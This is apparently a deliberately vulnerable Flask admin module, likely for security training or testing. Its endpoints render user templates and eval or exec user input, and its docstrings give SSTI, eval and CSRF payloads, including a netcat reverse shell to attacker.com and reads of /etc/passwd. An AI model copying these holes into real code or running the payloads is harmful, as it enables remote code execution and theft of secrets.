"""Admin views

VULNERABILITIES:
- SSTI via theme templates
- RCE via eval/exec
- Weak admin check
- No CSRF
"""

from flask import Blueprint, request, jsonify, render_template_string
from ..services.template_service import TemplateService
from ..services.theme_service import ThemeService
from ..models.user import User
from ..models.post import Post
from ..utils.auth_helper import admin_required, get_current_user

admin_bp = Blueprint('admin', __name__)


@admin_bp.route('/users')
@admin_required
def list_users():
    """List all users"""
    users = User.list_all()
    return jsonify(users)


@admin_bp.route('/render', methods=['POST'])
@admin_required
def render_template():
    """VULN: SSTI - Server-Side Template Injection
    CVE Reference: CVE-2019-8341 (Jinja2 SSTI), CVE-2023-29689 (Pyro CMS SSTI)
    
    Exploit: POST template={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
    Also: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
    """
    template_str = request.form.get('template', '')
    context = request.form.to_dict()
    
    # VULN: SSTI - user-controlled template
    try:
        result = TemplateService.render_custom(template_str, context)
        return jsonify({"success": True, "result": result})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@admin_bp.route('/evaluate', methods=['POST'])
@admin_required
def evaluate():
    """VULN: RCE via eval
    CVE Reference: CVE-2023-0297 (PyLoad RCE), CVE-2024-42845 (Invesalius3 RCE)
    
    Exploit: POST expr=__import__('os').system('whoami')
    Also: expr=__import__('subprocess').check_output(['cat','/etc/passwd']).decode()
    """
    expr = request.form.get('expr', '')
    
    # VULN: RCE via eval
    result = TemplateService.evaluate_expression(expr)
    return jsonify({"result": result})


@admin_bp.route('/execute', methods=['POST'])
@admin_required
def execute():
    """VULN: RCE via exec
    CVE Reference: CVE-2024-42845 (Invesalius3 RCE)
    
    Exploit: POST code=import os; os.system('nc attacker.com 4444 -e /bin/sh')
    """
    code = request.form.get('code', '')
    
    # VULN: RCE via exec
    output = TemplateService.execute_code(code)
    return jsonify({"output": output})


@admin_bp.route('/themes')
@admin_required
def list_themes():
    """List all themes"""
    themes = ThemeService.list_all()
    return jsonify(themes)


@admin_bp.route('/themes/create', methods=['POST'])
@admin_required
def create_theme():
    """VULN: SSTI - allows creating themes with malicious templates
    CVE Reference: CVE-2023-29689 (Pyro CMS SSTI)
    
    Exploit: POST name=evil &template={{ config['SECRET_KEY'] }}
    """
    name = request.form.get('name')
    template = request.form.get('template')  # VULN: No validation
    
    # VULN: Allows SSTI payload storage
    theme_id = ThemeService.create_custom_theme(name, template)
    return jsonify({"success": True, "theme_id": theme_id})


@admin_bp.route('/themes/activate/<int:theme_id>', methods=['POST'])
@admin_required
def activate_theme(theme_id):
    """VULN: No CSRF protection
    CVE Reference: CVE-2025-28062 (ERPNext CSRF)
    
    Attack: <img src="/admin/themes/activate/2">
    """
    # VULN: No CSRF protection
    ThemeService.set_theme(theme_id)
    return jsonify({"success": True})


@admin_bp.route('/test', methods=['GET'])
def test_admin():
    """Test endpoint to check admin access"""
    user = get_current_user()
    if not user:
        return jsonify({"message": "Not logged in"}), 401
    
    if user.get('is_admin'):
        return jsonify({
            "message": "Admin access granted",
            "user": user
        })
    else:
        return jsonify({"message": "Not admin"}), 403
